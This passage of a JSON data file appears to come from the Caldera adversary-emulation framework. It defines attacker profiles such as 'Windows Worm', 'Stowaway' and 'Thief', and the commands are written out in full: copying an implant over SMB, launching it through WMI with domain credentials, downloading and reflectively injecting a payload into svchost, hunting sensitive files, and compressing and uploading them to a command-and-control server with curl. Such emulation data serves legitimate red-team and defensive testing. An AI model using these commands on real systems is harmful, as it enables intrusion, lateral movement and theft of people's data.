"target.org.emailhost"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["ce485320-41a4-42e8-a510-f5a8fe96a644", "None", "target.org.emailhost"], "possible_subsequent_abilities": []}, {"ability_id": "b007fc38-9eb7-4320-92b3-9a3ad3e6ec25", "ability_name": "Get Chrome Bookmarks", "ability_description": "Get Chrome Bookmarks", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1217", "name": "Browser Bookmark Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "cat ~/Library/Application\\ Support/Google/Chrome/Default/Bookmarks\n", "parsers": {"plugins.stockpile.app.parsers.bookmarks": [{"source": "host.chrome.bookmark_title", "edge": "resolves_to", "target": "host.chrome.bookmark_url"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "0b5636cf-f019-4ec9-aa7c-6e4f55505374": {"adversary_name": "Windows Worm #1\n", "adversary_description": "Move laterally any way possible", "adversary_abilities_in_order": [{"ability_id": "85341c8c-4ecb-4579-8f53-43e3e91d7617", "ability_name": "Collect ARP details", "ability_description": "Locate all active IP and FQDNs on the network", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "arp -a", "parsers": {"plugins.stockpile.app.parsers.ipaddr": [{"source": "remote.host.ip"}]}}}, "linux": {"sh": {"command": "arp -a", "parsers": {"plugins.stockpile.app.parsers.ipaddr": [{"source": "remote.host.ip"}]}}}, "windows": {"psh,cmd": {"command": "arp -a", "parsers": {"plugins.stockpile.app.parsers.ipaddr": [{"source": "remote.host.ip"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["85341c8c-4ecb-4579-8f53-43e3e91d7617", "None", "remote.host.ip"], "possible_subsequent_abilities": []}, {"ability_id": "fa4ed735-7006-4451-a578-b516f80e559f", "ability_name": "Reverse nslookup IP", "ability_description": "Find hostname of remote IP in domain", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "ability_platforms": {"windows": {"psh": {"command": "nslookup #{remote.host.ip}\n", "parsers": {"plugins.stockpile.app.parsers.reverse_nslookup": [{"source": "remote.host.fqdn", "edge": "has_ip", "target": "remote.host.ip"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["fa4ed735-7006-4451-a578-b516f80e559f", "None", "remote.host.fqdn"], "possible_subsequent_abilities": [["921055f4-5970-4707-909e-62f594234d91", "remote.host.fqdn", "remote.host.fqdn"], ["2afae782-6d0a-4fbd-a6b6-d1ce90090eac", "remote.host.fqdn", "remote.host.fqdn"], ["95727b87-175c-4a69-8c7a-a5d82746a753", "remote.host.fqdn", "None"], ["aa6ec4dd-db09-4925-b9b9-43adeb154686", "remote.host.fqdn", "remote.host.fqdn"], ["65048ec1-f7ca-49d3-9410-10813e472b30", "remote.host.fqdn", "remote.host.fqdn"]]}, {"ability_id": "deeac480-5c2a-42b5-90bb-41675ee53c7e", "ability_name": "View remote shares", "ability_description": "View the shares of a remote host", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1135", "name": "Network Share Discovery"}, "ability_platforms": {"windows": {"psh": {"command": "net view \\\\#{remote.host.fqdn} /all", "parsers": {"plugins.stockpile.app.parsers.net_view": [{"source": "remote.host.fqdn", "edge": "has_share", "target": "remote.host.share"}]}}, "cmd": {"command": "net view \\\\#{remote.host.fqdn} /all", "parsers": {"plugins.stockpile.app.parsers.net_view": [{"source": "remote.host.fqdn", "edge": "has_share", "target": "remote.host.share"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["deeac480-5c2a-42b5-90bb-41675ee53c7e", "None", "remote.host.fqdn"], "possible_subsequent_abilities": [["921055f4-5970-4707-909e-62f594234d91", "remote.host.fqdn", "remote.host.fqdn"], ["2afae782-6d0a-4fbd-a6b6-d1ce90090eac", "remote.host.fqdn", "remote.host.fqdn"], ["95727b87-175c-4a69-8c7a-a5d82746a753", "remote.host.fqdn", "None"], ["aa6ec4dd-db09-4925-b9b9-43adeb154686", "remote.host.fqdn", "remote.host.fqdn"], ["65048ec1-f7ca-49d3-9410-10813e472b30", "remote.host.fqdn", "remote.host.fqdn"]]}, {"ability_id": "65048ec1-f7ca-49d3-9410-10813e472b30", "ability_name": "Copy 54ndc47 (SMB)", "ability_description": "Copy 54ndc47 to remote host (SMB)", "ability_tactic": "lateral-movement", "ability_technique": {"attack_id": "T1021.002", "name": "Remote Services: SMB/Windows Admin Shares"}, "ability_platforms": {"windows": {"psh": {"command": "$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\s4ndc4t.exe\";\n", "cleanup": "$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nRemove-Item -Path $drive\"\\Users\\Public\\s4ndc4t.exe\" -Force;\n", "parsers": {"plugins.stockpile.app.parsers.54ndc47_remote_copy": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}]}, "payloads": ["sandcat.go-windows"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["65048ec1-f7ca-49d3-9410-10813e472b30", "remote.host.fqdn", "remote.host.fqdn"], "possible_subsequent_abilities": [["921055f4-5970-4707-909e-62f594234d91", "remote.host.fqdn", "remote.host.fqdn"], ["2afae782-6d0a-4fbd-a6b6-d1ce90090eac", "remote.host.fqdn", "remote.host.fqdn"], ["95727b87-175c-4a69-8c7a-a5d82746a753", "remote.host.fqdn", "None"], ["aa6ec4dd-db09-4925-b9b9-43adeb154686", "remote.host.fqdn", "remote.host.fqdn"]]}, {"ability_id": "ece5dde3-d370-4c20-b213-a1f424aa8d03", "ability_name": "Start 54ndc47 (WMI)", "ability_description": "Remotely executes 54ndc47 over WMI", "ability_tactic": "execution", "ability_technique": {"attack_id": "T1047", "name": "Windows Management Instrumentation"}, "ability_platforms": {"windows": {"psh": {"command": "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}\";\n", "cleanup": "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"taskkill /f /im s4ndc4t.exe\"\n"}, "cmd": {"command": "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"cmd.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}\";\n", "cleanup": "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"taskkill /f /im s4ndc4t.exe\"\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "4c28c132-d7d7-4a04-8908-d643b7cb1d58": {"adversary_name": "Stowaway", "adversary_description": "Inject sandcat into a process (NOTE - Requires MinGW to be installed on Caldera Server)", "adversary_abilities_in_order": [{"ability_id": "05cda6f6-2b1b-462e-bff1-845af94343f7", "ability_name": "Discover injectable process", "ability_description": "Discovers processes that the current user has the ability to access and selects an injectable one", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1057", "name": "Process Discovery"}, "ability_platforms": {"windows": {"psh": {"command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json\n", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "host.process.id", "custom_parser_vals": {"json_key": "Id", "json_type": "int"}}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["05cda6f6-2b1b-462e-bff1-845af94343f7", "None", "host.process.id"], "possible_subsequent_abilities": [["3c647015-ab0a-496a-8847-6ab173cd2b22", "host.process.id", "None"], ["a398986f-31b0-436a-87e9-c8e82c028f3c", "host.process.id", "None"]]}, {"ability_id": "a398986f-31b0-436a-87e9-c8e82c028f3c", "ability_name": "Inject Sandcat into process", "ability_description": "Injects sandcat DLL into an available process", "ability_tactic": "defense-evasion", "ability_technique": {"attack_id": "T1055.002", "name": "Process Injection: Portable Executable Injection"}, "ability_platforms": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"shared.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$PEBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "eddc8f03-f930-41e7-95ba-33fb87bfed74": {"adversary_name": "Advanced Thief", "adversary_description": "An adversary to steal sensitive files", "adversary_abilities_in_order": [{"ability_id": "10fad81e-3f68-47be-83b6-fbee7711c6a9", "ability_name": "Advanced File Search and Stager", "ability_description": "Highly configurable file finder and stager for Linux and Windows. Drops a payload file to the host to parse\narguments rather than running multiple commands for each fact (e.g., each file type). This ability allows for a safe\nmode, only staging files found that have the appropriate file ending. The staging directory is configurable but\ndefaults to the current user's Recycle Bin (Windows) and /tmp (Linux). Payload files include default values for all\nparameters (matching the base fact source - File Search and Stage). Options for searches: file extensions (include,\nexclude [windows]), directories (include, exclude), accessed date cutoff, modified date cutoff, sensitive search\nstrings in files or titles.\n", "ability_tactic": "collection", "ability_technique": "None", "ability_platforms": "None", "id_dependence_fact_tuple -- (id, dependency, fact)": ["10fad81e-3f68-47be-83b6-fbee7711c6a9", "None", "host.dir.staged"], "possible_subsequent_abilities": [["a201bec2-a193-4b58-bf0e-57fa621da474", "host.dir.staged", "None"], ["5c5b0392-1daa-45e1-967c-2f361ce78849", "host.dir.staged", "host.dir.compress"], ["300157e5-f4ad-4569-b533-9d1fa0e74d74", "host.dir.staged", "host.dir.compress"], ["30a8cf10-73dc-497c-8261-a64cc9e91505", "host.dir.staged", "host.dir.compress"]]}, {"ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74", "ability_name": "Compress staged directory", "ability_description": "Compress a directory on the file system", "ability_tactic": "exfiltration", "ability_technique": {"attack_id": "T1560.001", "name": "Archive Collected Data: Archive via Utility"}, "ability_platforms": {"darwin": {"sh": {"command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "cleanup": "rm #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "linux": {"sh": {"command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "cleanup": "rm #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "windows": {"psh,pwsh": {"command": "Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;\nsleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select\n", "cleanup": "rm #{host.dir.staged}.zip\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["300157e5-f4ad-4569-b533-9d1fa0e74d74", "host.dir.staged", "host.dir.compress"], "possible_subsequent_abilities": [["e7bf5dc7-62e4-48b2-acf8-abaf8734c19c", "host.dir.compress", "None"], ["4a1120a5-971c-457f-bb07-60641b4723fd", "host.dir.compress", "None"], ["0582dc26-e0cf-4645-88cf-f37a02279976", "host.dir.compress", "None"], ["ea713bc4-63f0-491c-9a6f-0b01d560b87e", "host.dir.compress", "None"], ["3ce95a28-25fc-4a7e-a0cd-0fdb190e2081", "host.dir.compress", "None"], ["ba0deadb-97ac-4a4c-aa81-21912fc90980", "host.dir.compress", "None"], ["d754878c-17dd-46dc-891c-a993f8a10336", "host.dir.compress", "None"]]}, {"ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e", "ability_name": "Exfil staged directory", "ability_description": "Exfil the staged directory", "ability_tactic": "exfiltration", "ability_technique": {"attack_id": "T1041", "name": "Exfiltration Over C2 Channel"}, "ability_platforms": {"darwin": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}, "linux": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}, "windows": {"psh,pwsh": {"command": "$ErrorActionPreference = 'Stop';\n$fieldName = \"#{host.dir.compress}\";\n$filePath = \"#{host.dir.compress}\";\n$url = \"#{server}/file/upload\";\n\nAdd-Type -AssemblyName 'System.Net.Http';\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add(\"X-Request-Id\", $env:COMPUTERNAME + '-#{paw}');\n$client.DefaultRequestHeaders.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\");\n\n$result = $client.PostAsync($url, $content).Result;\n$result.EnsureSuccessStatusCode();\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "f98193a0-8b5b-4b5e-a5aa-e8c3adfcd4e6": {"adversary_name": "Undercover", "adversary_description": "Adversary to swap from built-in PowerShell to Core", "adversary_abilities_in_order": [{"ability_id": "60f63260-39bb-4136-87a0-b6c2dca799fc", "ability_name": "Install PowerShell Core 6", "ability_description": "Download, install and start new process under PowerShell Core 6", "ability_tactic": "command-and-control", "ability_technique": {"attack_id": "T1105", "name": "Ingress Tool Transfer"}, "ability_platforms": {"windows": {"psh": {"command": "$wc=New-Object System.Net.WebClient;\n$output=\"PowerShellCore.msi\";\n$wc.DownloadFile(\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\", $output);\nStart-Process msiexec.exe -ArgumentList \"/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\" -Wait;\n$env:Path += \";C:\\Program Files\\Powershell\\6\";\nStart-Process pwsh -ArgumentList \"-c #{location} -server #{server} - group #{group}\" -WindowStyle hidden;\n", "cleanup": "rm PowerShellCore.msi;\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "134b49a3-3f93-41bd-85f4-563eadbb6055", "ability_name": "Stop PowerShell processes", "ability_description": "Kill all PowerShell processes", "ability_tactic": "execution", "ability_technique": {"attack_id": "T1059.001", "name": "Command and Scripting Interpreter: PowerShell"}, "ability_platforms": {"windows": {"pwsh": {"command": "Get-Process -Name \"powershell\" | Stop-Process\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "5d3e170e-f1b8-49f9-9ee1-c51605552a08": {"adversary_name": "Collection", "adversary_description": "A collection adversary", "adversary_abilities_in_order": [{"ability_id": "1f7ff232-ebf8-42bf-a3c4-657855794cfe", "ability_name": "Find company emails", "ability_description": "Grep for all emails for the given target company", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1005", "name": "Data from Local System"}, "ability_platforms": {"darwin": {"sh": {"command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"\\b[A-Za-z0-9._%+-]+@#{target.org.name}\\b\" 2>/dev/null {} \\;\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "d69e8660-62c9-431e-87eb-8cf6bd4e35cf", "ability_name": "Find IP addresses", "ability_description": "Grep for IP addresses in file system per user", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1005", "name": "Data from Local System"}, "ability_platforms": {"darwin": {"sh": {"command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"(($(echo #{domain.broadcast.ip} | cut -d. -f-2))\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" 2>/dev/null {} \\;\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b", "ability_name": "Find files", "ability_description": "Locate files deemed sensitive", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1005", "name": "Data from Local System"}, "ability_platforms": {"darwin": {"sh": {"command": "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path", "edge": "has_extension", "target": "file.sensitive.extension"}]}}}, "windows": {"psh,pwsh": {"command": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path", "edge": "has_extension", "target": "file.sensitive.extension"}]}}}, "linux": {"sh": {"command": "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path", "edge": "has_extension", "target": "file.sensitive.extension"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["90c2efaa-8205-480d-8bb6-61d90dbaf81b", "None", "host.file.path"], "possible_subsequent_abilities": [["4e97e699-93d7-4040-b5a3-2e906a58199e", "host.file.path", "None"]]}, {"ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89", "ability_name": "Create staging directory", "ability_description": "create a directory for exfil staging", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1074.001", "name": "Data Staged: Local Data Staging"}, "ability_platforms": {"darwin": {"sh": {"command": "mkdir -p staged && echo $PWD/staged\n", "cleanup": "rm -rf staged\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}, "linux": {"sh": {"command": "mkdir -p staged && echo $PWD/staged\n", "cleanup": "rm -rf staged\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}, "windows": {"psh,pwsh": {"command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object\n", "cleanup": "Remove-Item -Path \"staged\" -recurse\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["6469befa-748a-4b9c-a96d-f191fde47d89", "None", "host.dir.staged"], "possible_subsequent_abilities": [["a201bec2-a193-4b58-bf0e-57fa621da474", "host.dir.staged", "None"], ["5c5b0392-1daa-45e1-967c-2f361ce78849", "host.dir.staged", "host.dir.compress"], ["300157e5-f4ad-4569-b533-9d1fa0e74d74", "host.dir.staged", "host.dir.compress"], ["30a8cf10-73dc-497c-8261-a64cc9e91505", "host.dir.staged", "host.dir.compress"]]}]}, "1a98b8e6-18ce-4617-8cc5-e65a1a9d490e": {"adversary_name": "Thief", "adversary_description": "An adversary to steal sensitive files", "adversary_abilities_in_order": [{"ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89", "ability_name": "Create staging directory", "ability_description": "create a directory for exfil staging", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1074.001", "name": "Data Staged: Local Data Staging"}, "ability_platforms": {"darwin": {"sh": {"command": "mkdir -p staged && echo $PWD/staged\n", "cleanup": "rm -rf staged\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}, "linux": {"sh": {"command": "mkdir -p staged && echo $PWD/staged\n", "cleanup": "rm -rf staged\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}, "windows": {"psh,pwsh": {"command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object\n", "cleanup": "Remove-Item -Path \"staged\" -recurse\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["6469befa-748a-4b9c-a96d-f191fde47d89", "None", "host.dir.staged"], "possible_subsequent_abilities": [["a201bec2-a193-4b58-bf0e-57fa621da474", "host.dir.staged", "None"], ["5c5b0392-1daa-45e1-967c-2f361ce78849", "host.dir.staged", "host.dir.compress"], ["300157e5-f4ad-4569-b533-9d1fa0e74d74", "host.dir.staged", "host.dir.compress"], ["30a8cf10-73dc-497c-8261-a64cc9e91505", "host.dir.staged", "host.dir.compress"]]}, {"ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b", "ability_name": "Find files", "ability_description": "Locate files deemed sensitive", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1005", "name": "Data from Local System"}, "ability_platforms": {"darwin": {"sh": {"command": "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path", "edge": "has_extension", "target": "file.sensitive.extension"}]}}}, "windows": {"psh,pwsh": {"command": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path", "edge": "has_extension", "target": "file.sensitive.extension"}]}}}, "linux": {"sh": {"command": "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path", "edge": "has_extension", "target": "file.sensitive.extension"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["90c2efaa-8205-480d-8bb6-61d90dbaf81b", "None", "host.file.path"], "possible_subsequent_abilities": [["4e97e699-93d7-4040-b5a3-2e906a58199e", "host.file.path", "None"]]}, {"ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e", "ability_name": "Stage sensitive files", "ability_description": "copy files to staging directory", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1074.001", "name": "Data Staged: Local Data Staging"}, "ability_platforms": {"darwin": {"sh": {"command": "cp \"#{host.file.path[filters(technique=T1005,max=3)]}\" #{host.dir.staged[filters(max=1)]}\n"}}, "linux": {"sh": {"command": "cp \"#{host.file.path[filters(technique=T1005,max=3)]}\" #{host.dir.staged[filters(max=1)]}\n"}}, "windows": {"psh": {"command": "Copy-Item #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}\n"}, "cmd": {"command": "copy #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74", "ability_name": "Compress staged directory", "ability_description": "Compress a directory on the file system", "ability_tactic": "exfiltration", "ability_technique": {"attack_id": "T1560.001", "name": "Archive Collected Data: Archive via Utility"}, "ability_platforms": {"darwin": {"sh": {"command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "cleanup": "rm #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "linux": {"sh": {"command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "cleanup": "rm #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "windows": {"psh,pwsh": {"command": "Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;\nsleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select\n", "cleanup": "rm #{host.dir.staged}.zip\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["300157e5-f4ad-4569-b533-9d1fa0e74d74", "host.dir.staged", "host.dir.compress"], "possible_subsequent_abilities": [["e7bf5dc7-62e4-48b2-acf8-abaf8734c19c", "host.dir.compress", "None"], ["4a1120a5-971c-457f-bb07-60641b4723fd", "host.dir.compress", "None"], ["0582dc26-e0cf-4645-88cf-f37a02279976", "host.dir.compress", "None"], ["ea713bc4-63f0-491c-9a6f-0b01d560b87e", "host.dir.compress", "None"], ["3ce95a28-25fc-4a7e-a0cd-0fdb190e2081", "host.dir.compress", "None"], ["ba0deadb-97ac-4a4c-aa81-21912fc90980", "host.dir.compress", "None"], ["d754878c-17dd-46dc-891c-a993f8a10336", "host.dir.compress", "None"]]}, {"ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e", "ability_name": "Exfil staged directory", "ability_description": "Exfil the staged directory", "ability_tactic": "exfiltration", "ability_technique": {"attack_id": "T1041", "name": "Exfiltration Over C2 Channel"}, "ability_platforms": {"darwin": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}, "linux": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}, "windows": {"psh,pwsh": {"command": "$ErrorActionPreference = 'Stop';\n$fieldName = \"#{host.dir.compress}\";\n$filePath = \"#{host.dir.compress}\";\n$url = \"#{server}/file/upload\";\n\nAdd-Type -AssemblyName 'System.Net.Http';\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add(\"X-Request-Id\", $env:COMPUTERNAME + '-#{paw}');\n$client.DefaultRequestHeaders.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\");\n\n$result = $client.PostAsync($url, $content).Result;\n$result.EnsureSuccessStatusCode();\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "ddbd1850-5fd7-41d5-a7a1-1b15dac49090": {"adversary_name": "Windows Worm #3\n", "adversary_description": "Move laterally with SMB and WinRM", "adversary_abilities_in_order": [{"ability_id": "85341c8c-4ecb-4579-8f53-43e3e91d7617", "ability_name": "Collect ARP details", "ability_description": "Locate all active IP and FQDNs on the network", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "arp -a", "parsers": {"plugins.stockpile.app.parsers.ipaddr": [{"source": "remote.host.ip"}]}}}, "linux": {"sh": {"command": "arp -a", "parsers": {"plugins.stockpile.app.parsers.ipaddr": [{"source": "remote.host.ip"}]}}}, "windows": {"psh,cmd": {"command": "arp -a", "parsers": {"plugins.stockpile.app.parsers.ipaddr": [{"source": "remote.host.ip"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["85341c8c-4ecb-4579-8f53-43e3e91d7617", "None", "remote.host.ip"], "possible_subsequent_abilities": []}, {"ability_id": "fa4ed735-7006-4451-a578-b516f80e559f", "ability_name": "Reverse nslookup IP", "ability_description": "Find hostname of remote IP in domain", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "ability_platforms": {"windows": {"psh": {"command": "nslookup #{remote.host.ip}\n", "parsers": {"plugins.stockpile.app.parsers.reverse_nslookup": [{"source": "remote.host.fqdn", "edge": "has_ip", "target": "remote.host.ip"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["fa4ed735-7006-4451-a578-b516f80e559f", "None", "remote.host.fqdn"], "possible_subsequent_abilities": [["921055f4-5970-4707-909e-62f594234d91", "remote.host.fqdn", "remote.host.fqdn"], ["2afae782-6d0a-4fbd-a6b6-d1ce90090eac", "remote.host.fqdn", "remote.host.fqdn"], ["95727b87-175c-4a69-8c7a-a5d82746a753", "remote.host.fqdn", "None"], ["aa6ec4dd-db09-4925-b9b9-43adeb154686", "remote.host.fqdn", "remote.host.fqdn"], ["65048ec1-f7ca-49d3-9410-10813e472b30", "remote.host.fqdn", "remote.host.fqdn"]]}, {"ability_id": "deeac480-5c2a-42b5-90bb-41675ee53c7e", "ability_name": "View remote shares", "ability_description": "View the shares of a remote host", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1135", "name": 